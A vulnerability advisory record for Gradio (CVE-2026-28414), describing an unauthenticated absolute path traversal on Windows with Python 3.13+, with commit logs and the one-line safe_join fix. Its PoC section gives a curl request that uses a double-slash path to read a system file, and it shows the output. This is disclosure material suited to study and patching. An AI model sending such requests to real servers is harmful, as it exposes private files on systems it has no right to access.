# GHSA-39MP-8HJ3-5C49

repo: gradio-app/gradio

summary: Gradio is Vulnerable to Absolute Path Traversal on Windows with Python 3.13+

aliases: ['CVE-2026-28414']

severity: HIGH

evidence: file_history blamed_lines=0 files=['gradio/utils.py']

intro: 029034f7853ea018d110efe9b7e2ef7d1407091c

intro_subject: [No Merge] Gradio 6.0  (#11908)

intro_date: 2025-11-21T10:57:22-05:00

fix: 6011b00d0154b85532fa901dd73cf8fa7d86fd04

affected: [
  {
    "package": {
      "ecosystem": "PyPI",
      "name": "gradio"
    },
    "ranges": [
      {
        "type": "ECOSYSTEM",
        "events": [
          {
            "introduced": "0"
          },
          {
            "fixed": "6.7.0"
          }
        ]
      }
    ]
  }
]

DETAILS:
### Summary
Gradio apps running on Window with Python 3.13+ are vulnerable to an absolute path traversal issue that enables unauthenticated attackers to read arbitrary files from the file system.

### Details
Python 3.13+ changed the definition of `os.path.isabs` so that root-relative paths like `/windows/win.ini` on Windows are no longer considered absolute paths, resulting in a vulnerability in Gradio's logic for joining paths safely.

This can be exploited by unauthenticated attackers to read arbitrary files from the Gradio server, even when Gradio is set up with authentication.

### PoC
```
% curl http://10.10.10.10:7860/static//windows/win.ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### Impact
Arbitrary file read in the context of the Windows user running Gradio.

REFS:
- WEB https://github.com/gradio-app/gradio/security/advisories/GHSA-39mp-8hj3-5c49
- ADVISORY https://nvd.nist.gov/vuln/detail/CVE-2026-28414
- WEB https://github.com/gradio-app/gradio/commit/6011b00d0154b85532fa901dd73cf8fa7d86fd04
- PACKAGE https://github.com/gradio-app/gradio
- WEB https://github.com/pypa/advisory-database/tree/main/vulns/gradio/PYSEC-2026-64.yaml

INTRO_LOG:
029034f7853ea018d110efe9b7e2ef7d1407091c
Freddy Boulton <41651716+freddyaboulton@users.noreply.github.com>
2025-11-21T10:57:22-05:00
[No Merge] Gradio 6.0  (#11908)

* Add code

* Fix

* version numbers

* Remove `crop_size` parameter from `ImageEditor` component (#12007)

* Remove crop_size parameter from ImageEditor __init__ function and docstring description

* Remove conversion code and deprecation warning message

* Fix docstring typo

* Remove deprecated ImageEditor crop_size references from demo files

* Remove crop_size parameters and variable assignments in super().__init__() calls for Sketchpad, Paint, and ImageMask classes that inherit from ImageEditor

* Regenerated notebook files

---------

Co-authored-by: pngwn <hello@pngwn.io>

* add changeset

* Fix (#12014)

* Remove tuples format from the chatbot (#12012)

* First draft

* Fix tests

* add changeset

* format

* Fix reload test

* Fix chatbot unit tests

* lint

* lint2

* Python unit tests

* Fix code

* Fix notebook

---------

Co-authored-by: gradio-pr-bot <gradio-pr-bot@users.noreply.github.com>

* fix: enable padding by default in Markdown component (#12010)

* fix: enable padding by default in Markdown component

* add changeset

* add changeset

* Fix: set the padding to false for both HTML and Markup

* Enable padding by default in HTML component

* fix: Fixed failing unit test and a docstring

---------

Co-authored-by: Abubakar Abid <abubakar@huggingface.co>
Co-authored-by: gradio-pr-bot <gradio-pr-bot@users.noreply.github.com>
Co-authored-by: Freddy Boulton <41651716+freddyaboulton@users.noreply.github.com>

* Make allow_tags=True the default in gr.Chatbot (#12027)

* Set allow tags to true by default.

* add changeset

---------

Co-authored-by: gradio-pr-bot <gradio-pr-bot@users.noreply.github.com>

* Remove all parameters with deprecation warnings (#12047)

* Fix

* Fix

* Fix

* lint

* Fix

* Remove max_length and min_length from gr.Audio and gr.Video (#12043)

* Audio

* Fix

* Video

* Fix

* Docs

* Fix tests

* Fix

* Fix

* Fix typos

* Add a single `buttons` parameter to components instead of the various `show_xxxxxxx_button` parameters (#12042)

* change buttons

* docstring

* changes

* changes

* notebooks

* changes

* changes

* fix tests

* fix lint

* changes

* changes

* fix json test

* story

* format

* Rename hf token to token (#12048)

* Rename hf_token -> token

* remove

* Do client

* remaining files

* Guides

* Fix

* empty

* Video subtitles (#1

INTRO_STAT:
 .changeset/afraid-signs-judge.md                   |     7 +
 .changeset/angry-pets-jump.md                      |     6 +
 .changeset/better-doors-press.md                   |    10 +
 .changeset/brave-bushes-appear.md                  |     7 +
 .changeset/brave-planets-fetch.md                  |     6 +
 .changeset/breezy-webs-accept.md                   |     5 +
 .changeset/brown-years-sell.md                     |     6 +
 .changeset/busy-turtles-think.md                   |     5 +
 .changeset/chatty-wasps-burn.md                    |     5 +
 .changeset/clear-moments-sin.md                    |     7 +
 .changeset/clear-tips-sell.md                      |     7 +
 .changeset/cool-squids-smash.md                    |     7 +
 .changeset/cool-steaks-drop.md                     |    38 +
 .changeset/cyan-pianos-accept.md                   |     6 +
 .changeset/dark-flowers-poke.md                    |    10 +
 .changeset/dark-words-create.md                    |     5 +
 .changeset/dull-otters-double.md                   |     6 +
 .changeset/eighty-peaches-itch.md                  |     6 +
 .changeset/eleven-beds-serve.md                    |     5 +
 .changeset/every-candies-wonder.md                 |     7 +
 .changeset/evil-carrots-refuse.md                  |    11 +
 .changeset/evil-glasses-cheer.md                   |     6 +
 .changeset/fast-crabs-sneeze.md                    |     6 +
 .changeset/fine-wolves-call.md                     |     6 +
 .changeset/

INTRO_DIFF_OVERLAP:
diff --git a/gradio/utils.py b/gradio/utils.py
index bccb87728..422468806 100644
--- a/gradio/utils.py
+++ b/gradio/utils.py
@@ -8,6 +8,7 @@ import copy
 import functools
 import hashlib
 import importlib
+import importlib.metadata
 import importlib.resources
 import importlib.util
 import inspect
@@ -61,9 +62,11 @@ import httpx
 import orjson
 from gradio_client.documentation import document
 from gradio_client.exceptions import AppError
+from packaging import version
 from typing_extensions import ParamSpec
 
 import gradio
+from gradio import themes
 from gradio.context import get_blocks_context
 from gradio.data_classes import (
     BlocksConfigDict,
@@ -72,6 +75,8 @@ from gradio.data_classes import (
     UserProvidedPath,
 )
 from gradio.exceptions import Error, InvalidPathError
+from gradio.themes import Default as DefaultTheme
+from gradio.themes import ThemeClass as Theme
 
 if TYPE_CHECKING:  # Only import for type checking (is False at runtime).
     from gradio.blocks import BlockContext, Blocks
@@ -82,6 +87,20 @@ if TYPE_CHECKING:  # Only import for type checking (is False at runtime).
 P = ParamSpec("P")
 T = TypeVar("T")
 
+BUILT_IN_THEMES: dict[str, Theme] = {
+    t.name: t
+    for t in [
+        themes.Base(),
+        themes.Default(),
+        themes.Monochrome(),
+        themes.Soft(),
+        themes.Glass(),
+        themes.Origin(),
+        themes.Citrus(),
+        themes.Ocean(),
+    ]
+}
+
 
 def get_package_version() -> str:
     try:
@@ -148,13 +167,89 @@ class BaseReloader(ABC):
         demo.is_running = True
         demo.allowed_paths = self.running_app.blocks.allowed_paths
         demo.blocked_paths = self.running_app.blocks.blocked_paths
+        demo.theme = self.running_app.blocks.theme
+        demo.head_paths = self.running_app.blocks.head_paths
+        demo.css = self.running_app.blocks.css
+        demo.head = self.running_app.blocks.head
+        demo.css_paths = self.running_app.blocks.css_paths
+        demo._set_html_css_theme_variables()
         self.running_app.state_holder.set_blocks(demo)
         for session in self.running_app.state_holder.session_data.values():
             session.blocks_config = copy.copy(demo.default_config)
         self.running_app.blocks = demo
 
 
-class SourceFileReloader(BaseReloader):
+class ServerReloader(BaseReloader):
+    @property
+    @abstractmethod
+    def stop_event(self) -> threading.Event:
+        pass
+
+    def stop(self) -> None:
+        self.stop_event.set()
+
+    def get_demo_name(self, module: ModuleType, default_name: str) -> str:
+        def log(*args):
+            print("GRADIO_HOT_RELOAD:", *args)
+
+        if (demo := self.running_app.blocks) is None:
+            log("Unexpected undefined blocks in launching app")
+            return default_name
+        if default_name:
+            if module.__dict__.get(default_name) is not demo:
+                log(f"'{default_name}' in {module.__name__} is not the launched demo")
+            return default_name
+        for name, value in module.__dict__.copy().items():
+            if value is demo:
+                if name != "demo":
+                    log(f"Using '{name}' for demo name")
+                return name
+        log(f"Launching demo not found in {module.__name__}. Using 'demo'")
+        return "demo"
+
+
+class SpacesReloader(ServerReloader):
+    def __init__(
+        self,
+        app: App,
+        watch_dirs: list[str],
+        watch_module: ModuleType,
+        stop_event: threading.Event,
+        demo_name: str,
+    ):
+        from gradio.cli.commands.reload import reload_thread
+
+        self.app = app
+        self.demo_name = self.get_demo_name(watch_module, demo_name)
+        self.watch_dirs = watch_dirs
+        self.watch_module = watch_module
+        self.reload_thread = reload_thread
+        self._stop_event = stop_event
+
+    @property
+    def running_app(self) -> App:
+        return self.app
+
+    @property
+    def stop_

FIX_LOG:
6011b00d0154b85532fa901dd73cf8fa7d86fd04
Freddy Boulton <41651716+freddyaboulton@users.noreply.github.com>
2026-02-24T14:22:29-05:00
Fix absolute path issue in Windows (#12926)

* Fix absolute path issue

* add changeset

* add changeset

---------

Co-authored-by: gradio-pr-bot <gradio-pr-bot@users.noreply.github.com>


FIX_STAT:
 .changeset/proud-badgers-doubt.md | 5 +++++
 gradio/utils.py                   | 1 +
 2 files changed, 6 insertions(+)


FIX_DIFF_OVERLAP:
diff --git a/gradio/utils.py b/gradio/utils.py
index d69433903..233238034 100644
--- a/gradio/utils.py
+++ b/gradio/utils.py
@@ -1696,6 +1696,7 @@ def safe_join(directory: DeveloperPath, path: UserProvidedPath) -> str:
     if (
         any(sep in filename for sep in _os_alt_seps)
         or os.path.isabs(filename)
+        or filename.startswith("/")
         or filename == ".."
         or filename.startswith("../")
     ):


intro_is_ancestor_of_fix: True

tags_contain_intro_sample: []

tags_contain_fix_sample: []

tags_with_intro_not_fix_sample: []